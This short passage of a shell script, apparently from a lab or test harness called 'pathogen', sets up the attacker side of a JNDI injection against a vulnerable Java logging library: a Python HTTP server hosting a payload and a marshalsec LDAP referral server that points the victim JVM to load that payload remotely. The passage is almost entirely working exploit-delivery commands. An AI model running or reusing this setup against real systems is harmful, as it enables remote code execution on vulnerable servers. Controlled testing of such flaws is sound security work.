...
cd /pathogen/www && python3 -m http.server 8888 &
HTTP_PID=$!

# marshalsec LDAP referral server on :1389. Returns a CodebaseRef to the HTTP
# URL below, which the vulnerable logging library JVM dereferences and loads.
#
...
#   CODEBASE_HOST  just the host   (default: the in-cluster pathogen service)
...
: "${CODEBASE_URL:=http://${CODEBASE_HOST:-pathogen.pathogen-ns.svc.cluster.local}:8888/#Payload}"
echo "[pathogen] LDAP referral codebase = $CODEBASE_URL"
java -cp /pathogen/marshalsec.jar marshalsec.jndi.LDAPRefServer "$CODEBASE_URL" 1389 &
LDAP_PID=$!
